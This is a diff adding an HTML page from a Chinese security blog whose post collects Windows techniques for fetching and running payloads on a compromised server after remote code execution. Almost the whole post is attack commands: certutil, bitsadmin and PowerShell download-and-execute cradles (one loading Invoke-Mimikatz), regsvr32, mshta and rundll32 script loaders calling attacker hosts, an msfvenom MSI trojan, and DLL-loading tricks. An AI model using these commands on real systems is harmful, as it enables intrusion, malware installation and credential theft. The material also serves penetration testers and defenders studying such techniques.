@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/w.ico?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.7.0',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="背景：很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,而其可使用姿势收集整理如下： 方式certutil123证书服务的一部分，可用来下载木马。certutil -urlcache -split -f http://x.x.x.x/msf a.exe">
+<meta name="keywords" content="Windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows下命令执行">
+<meta property="og:url" content="http://sunu11.com/2019/09/02/windows下命令执行/index.html">
+<meta property="og:site_name" content="SuNu11&#39;Blog">
+<meta property="og:description" content="背景：很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,而其可使用姿势收集整理如下： 方式certutil123证书服务的一部分，可用来下载木马。certutil -urlcache -split -f http://x.x.x.x/msf a.exe">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-05T07:58:17.872Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows下命令执行">
+<meta name="twitter:description" content="背景：很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,而其可使用姿势收集整理如下： 方式certutil123证书服务的一部分，可用来下载木马。certutil -urlcache -split -f http://x.x.x.x/msf a.exe">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="SuNu11'Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://sunu11.com/2019/09/02/windows下命令执行/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>windows下命令执行 | SuNu11'Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SuNu11'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">记录分享学习生活</h1>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-首页">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-分类">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-标签">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-关于">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-导航图">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Guide/" rel="section"><i class="menu-item-icon fa fa-fw fa-globe"></i> <br>导航图</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-公益404">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404.html" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益404</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sunu11.com/2019/09/02/windows下命令执行/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="SuNu11">
+      <meta itemprop="description" content="淡泊以明志，宁静以致远">
+      <meta itemprop="image" content="/images/me.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SuNu11'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">windows下命令执行
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-02 16:39:12" itemprop="dateCreated datePublished" datetime="2019-09-02T16:39:12+08:00">2019-09-02</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-09-05 15:58:17" itemprop="dateModified" datetime="2019-09-05T15:58:17+08:00">2019-09-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>很多RCE漏洞均能有效在靶机中执行命令，但存在服务器可出网与不可出网的区别。对windows服务器而言，如果能出网。我们利用RCE获取服务器shell的方式都离不开上传shellcode到靶机上,而其可使用姿势收集整理如下：</p>
+<h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">证书服务的一部分，可用来下载木马。</span><br><span class="line">certutil -urlcache -split -f http://x.x.x.x/msf a.exe &amp;&amp; a.exe</span><br><span class="line">certutil.exe -urlcache -split -f http://x.x.x.x/x.jar &amp;&amp;java -jar x.jar</span><br></pre></td></tr></table></figure>
+<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a)、powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://x/1.jpg‘,&apos;C:\Users\x\Desktop\test\12.exe&apos;)</span><br><span class="line">b)、powershell (Invoke-WebRequest http://x/1.jpg -O x.jpg)</span><br><span class="line">c)、也可以通过从UVC读取脚本执行：</span><br><span class="line">powershell -exec bypass -f \\webdavserver\a.ps1</span><br><span class="line">d)、内存加载：</span><br><span class="line">1、powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</span><br><span class="line"></span><br><span class="line">2、powershell -exec bypass -c &quot;iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9ccedf9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;cs shellcode address&apos;))&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin 可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议。</span><br><span class="line">bitsadmin /TRANSFER /DOWNLOAD http://x.x.x.x/a C:\tmp\1 下载文件到靶机中</span><br><span class="line">bitsadmin /TRANSFER /UPLOAD D:\\1.ps \\共享目录\folder\xx 上传到共享目录（未测试）</span><br></pre></td></tr></table></figure>
+<h4 id="CScript-WScript"><a href="#CScript-WScript" class="headerlink" title="CScript/WScript"></a>CScript/WScript</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">两种方式，第一种直接执行UNC路径下的文件：</span><br><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br><span class="line"></span><br><span class="line">第二种分两步先写入脚本后调用：</span><br><span class="line">a)</span><br><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; c:\windows\temp\d.vbs</span><br><span class="line">b)</span><br><span class="line">cscript C:\Windows\Temp\d.vbs http://x.x.x.x/a C:\Windows\Temp\1.exe</span><br></pre></td></tr></table></figure>
+<h4 id="CSC"><a href="#CSC" class="headerlink" title="CSC"></a>CSC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">该方式也是通过先写入具有下载功能的c语言程序，通过csc打包成exe，再通过该exe下载</span><br><span class="line">1、echo using System.Net;class WebDL &#123; static void Main(string[] args)&#123;System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);&#125;&#125; &gt; c:\windows\temp\svhost.cs</span><br><span class="line">2、找到csc的所在目录，然后调用编译cs文件：</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc /out:c:\windows\temp\svhost.exe C:\Windows\Temp\svhost.cs</span><br><span class="line">3、使用svhost.exe执行下载</span><br><span class="line">c:\windows\temp\dl.exe http://xx/a.sh c:\windows\temp\a.sh</span><br></pre></td></tr></table></figure>
+<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先将要执行的命令写入到ftp.txt，再使用ftp -s:ftp.txt执行文本中的命令</span><br><span class="line">ftp.txt:</span><br><span class="line">open xx.x.x.x 21</span><br><span class="line">GET xxx.exe</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<h4 id="JScript"><a href="#JScript" class="headerlink" title="JScript"></a>JScript</h4><p>1、写入以下文件执行即可a.js:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);</span><br><span class="line">Object.open(&quot;GET&quot;,&quot;http://x/a&quot;,false);</span><br><span class="line">Object.send();</span><br><span class="line">if (Object.Status == 200)</span><br><span class="line">&#123;</span><br><span class="line">var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">Stream.Open();</span><br><span class="line">Stream.Type = 1;</span><br><span class="line">Stream.Write(Object.ResponseBody);</span><br><span class="line">Stream.SaveToFile(&quot;C:\\Users\\x\\Desktop\\test\\212.exe&quot;, 2);</span><br><span class="line">Stream.Close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http://site.com/a.png scrobj.dll</span><br><span class="line">远程加载</span><br><span class="line"></span><br><span class="line">a.png:</span><br><span class="line"></span><br><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;!-- Learn from Casey Smith @subTee --&gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps  = &quot;ps script&quot;;</span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line"> </span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mshta接受URL作为一个参数来执行HTA</span><br><span class="line">1） mshta http://xxxx.com/test.hta</span><br><span class="line">使用 mshta \\webdavserver\folder\payload.hta 还可隐藏mshta.exe所下载的内容。</span><br><span class="line">Msht具有执行内联脚本的能力，它将下载并执行一个脚本作为有效负载:</span><br><span class="line">2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://xxxxx.com/payload.sct&quot;&quot;)&quot;))</span><br><span class="line"></span><br><span class="line">test.hta:</span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;xxx.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new%20ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://reverse-tcp.xyz/test.exe&quot;,false);Object.send();if(Object.Status==200)&#123;Stream=new%20ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;E:\\test\\ssss2.exe&quot;,2);Stream.Close();&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;%</span><br></pre></td></tr></table></figure>
+<h4 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pubprn.vbs是windows 7以后操作系统中存在的WSH脚本，它使用了GetObject()并且参数可控。</span><br><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br><span class="line">详情可参考：https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/</span><br></pre></td></tr></table></figure>
+<p>图1:</p>
+<h4 id="winrm-vbs-slmgr-vbs"><a href="#winrm-vbs-slmgr-vbs" class="headerlink" title="winrm.vbs/slmgr.vbs"></a>winrm.vbs/slmgr.vbs</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用该方式执行命令首先需要上传一个xsl文件，如下图所示：</span><br><span class="line">WsmPty.xsl:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method=&quot;text&quot;&gt;&lt;/output&gt;</span><br><span class="line"> &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line"> ]]&gt; &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br><span class="line"></span><br><span class="line">在上传xsl文件之后，使用以下批处理文件进行启动：</span><br><span class="line">mkdir %SystemDrive%\可控目录</span><br><span class="line">copy %windir%\System32\cscript.exe %SystemDrive%\BypassDir</span><br><span class="line">%SystemDrive%\可控目录\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty</span><br></pre></td></tr></table></figure>
+<h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>先通过msf生成msi木马文件，在使用该命令包含msi文件上线。(免杀是个关键问题)<br><code>msiexec /q /i http://x/x.png</code><br>msf生成msi格式即可，可重命名为png<br><code>msfvenom -f msi xxx &gt; x,png</code></p>
+<h4 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://xx.x/a.exe</span><br></pre></td></tr></table></figure>
+<h4 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h4><p><code>cmd.exe /k &lt; \\webdavserver\1.txt</code> 需要使用UNC/WebDAV服务器</p>
+<h4 id="Regasm-Regsvc"><a href="#Regasm-Regsvc" class="headerlink" title="Regasm/Regsvc"></a>Regasm/Regsvc</h4><p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\1.dll</code> 需要使用UNC/WebDAV服务器</p>
+<h4 id="Msbuild"><a href="#Msbuild" class="headerlink" title="Msbuild"></a>Msbuild</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\x.xml &gt; x.xml &amp; !MB! x.xml&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="pcalua-exe"><a href="#pcalua-exe" class="headerlink" title="pcalua.exe"></a>pcalua.exe</h4><p><code>pcalua.exe -a \\webdavserver\1.dll</code> 需要使用UNC/WebDAV服务器</p>
+<h4 id="Cmstp"><a href="#Cmstp" class="headerlink" title="Cmstp"></a>Cmstp</h4><p><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code><br>该方式未复现，先记录一下：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY2ODU=" title="https://www.anquanke.com/post/id/86685">https://www.anquanke.com/post/id/86685<i class="fa fa-external-link"></i></span></p>
+<h4 id="MavInject32"><a href="#MavInject32" class="headerlink" title="MavInject32"></a>MavInject32</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查阅资料是使用以下命令将恶意dll文件注入到正常进程中执行：(测试未建立连接2333)</span><br><span class="line">C:\Windows\SysWOW64\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两种加载恶意dll文件执行的方式，/F后可拼接任意后缀。</span><br><span class="line">odbcconf.exe /A &#123;REGSVR evil.dll&#125;</span><br><span class="line">odbcconf.exe / F odbcconf.config（可写一个任意后缀文件，里面内容加载获取shell的dll。如果文件未在odbcconf.exe目录下dll文件需有绝对路径。）</span><br></pre></td></tr></table></figure>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>1、执行命令的方式可跟其他技术结合，因此总结该文又浮现一个大坑。<br>免杀问题。无论是打破边界获取入口点权限还是内网拓展、钓鱼攻击等等情况都对免杀有绝对依赖。</p>
+<p>2、UNC/WebDAV路径利用相关文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY4OTQ=" title="https://www.anquanke.com/post/id/86894">https://www.anquanke.com/post/id/86894<i class="fa fa-external-link"></i></span></p>
+<p>3、一个JS加载.Net程序的工具：DotNetToJScript <span class="exturl" data-url="aHR0cHM6Ly93d3cuNGhvdS5jb20vdG9vbHMvNjE3MS5odG1s" title="https://www.4hou.com/tools/6171.html">https://www.4hou.com/tools/6171.html<i class="fa fa-external-link"></i></span></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+      <div>
+    
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="icon ion-md-power"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+      </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="SuNu11 Alipay">
+        <p>Alipay</p>
+      </div>
